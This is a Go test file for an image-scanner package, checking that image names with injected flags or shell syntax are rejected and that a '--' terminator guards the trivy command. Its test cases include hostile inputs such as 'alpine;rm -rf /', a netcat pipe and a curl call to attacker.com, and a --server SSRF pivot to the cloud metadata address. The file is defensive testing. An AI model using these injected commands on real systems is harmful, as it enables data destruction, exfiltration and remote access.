package scanner

import (
	"context"
	"os/exec"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// TestValidateImageName exercises every branch of ValidateImageName: valid
// docker image references (happy path) and hostile inputs that would be
// interpreted as extra trivy/docker CLI flags if passed through unchecked
// (argument injection → SSRF pivot via trivy's --server flag, since the
// scan container has the Docker socket mounted).
func TestValidateImageName(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		image   string
		wantErr bool
	}{
		// ── Happy path ──────────────────────────────────────────────────
		{name: "simple name", image: "alpine", wantErr: false},
		{name: "name with tag", image: "nginx:1.25", wantErr: false},
		{name: "name with registry and port", image: "registry.example.com:5000/team/app:latest", wantErr: false},
		{name: "name with nested path", image: "docker.io/library/ubuntu:22.04", wantErr: false},
		{name: "name with digest", image: "alpine@sha256:" + strings.Repeat("a", 64), wantErr: false},
		{name: "name with underscores and dots", image: "my_app.service:v1.2.3", wantErr: false},

		// ── Hostile path: argument/flag injection ──────────────────────
		{name: "leading dash (flag-like)", image: "-v", wantErr: true},
		{name: "trivy --server SSRF pivot", image: "--server=http://169.254.169.254", wantErr: true},
		{name: "double dash flag", image: "--output=/etc/passwd", wantErr: true},
		{name: "shell metacharacters", image: "alpine;rm -rf /", wantErr: true},
		{name: "pipe injection", image: "alpine|nc attacker.com 4444", wantErr: true},
		{name: "command substitution", image: "$(curl attacker.com)", wantErr: true},
		{name: "backtick substitution", image: "`whoami`", wantErr: true},
		{name: "space-containing value", image: "alpine latest", wantErr: true},
		{name: "newline injection", image: "alpine\n--server=http://evil", wantErr: true},
		{name: "empty string", image: "", wantErr: true},
		{name: "only whitespace", image: "   ", wantErr: true},
		{name: "digest too short", image: "alpine@sha256:abc123", wantErr: true},
		{name: "path traversal", image: "../../etc/passwd", wantErr: true},
	}

	for _, tc := range tests {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := ValidateImageName(tc.image)
			if tc.wantErr {
				assert.Error(t, err, "ValidateImageName(%q) should be rejected", tc.image)
			} else {
				assert.NoError(t, err, "ValidateImageName(%q) should be accepted", tc.image)
			}
		})
	}
}

// TestScanImageFunc_RejectsHostileImageNameBeforeExec confirms ScanImageFunc
// validates the image name and never spawns a subprocess for a hostile value
// — closing the argument-injection path even if a caller forgets to validate
// upstream.
func TestScanImageFunc_RejectsHostileImageNameBeforeExec(t *testing.T) {
	origExec := execCommandContext
	defer func() { execCommandContext = origExec }()

	execCalled := false
	execCommandContext = func(ctx context.Context, command string, args ...string) *exec.Cmd {
		execCalled = true
		return mockExecCommandContext(ctx, command, args...)
	}

	_, err := ScanImageFunc(context.Background(), nil, "--server=http://169.254.169.254")
	assert.Error(t, err)
	assert.False(t, execCalled, "docker/trivy subprocess must never be spawned for a rejected image name")
}

// TestScanImageFunc_AppendsArgumentTerminator confirms the "--" terminator is
// present immediately before the image name in the constructed trivy
// command, so the image name can never be parsed as a trivy/docker flag even
// if ValidateImageName's allow-list is ever loosened by mistake.
func TestScanImageFunc_AppendsArgumentTerminator(t *testing.T) {
	origExec := execCommandContext
	defer func() { execCommandContext = origExec }()

	var capturedArgs []string
	execCommandContext = func(ctx context.Context, command string, args ...string) *exec.Cmd {
		capturedArgs = append([]string{}, args...)
		return mockExecCommandContext(ctx, command, args...)
	}

	_, err := ScanImageFunc(context.Background(), nil, "alpine:3.19")
	assert.NoError(t, err)
	if len(capturedArgs) < 2 {
		t.Fatalf("expected at least 2 trailing args, got %v", capturedArgs)
	}
	last := capturedArgs[len(capturedArgs)-1]
	secondToLast := capturedArgs[len(capturedArgs)-2]
	assert.Equal(t, "alpine:3.19", last)
	assert.Equal(t, "--", secondToLast)
}

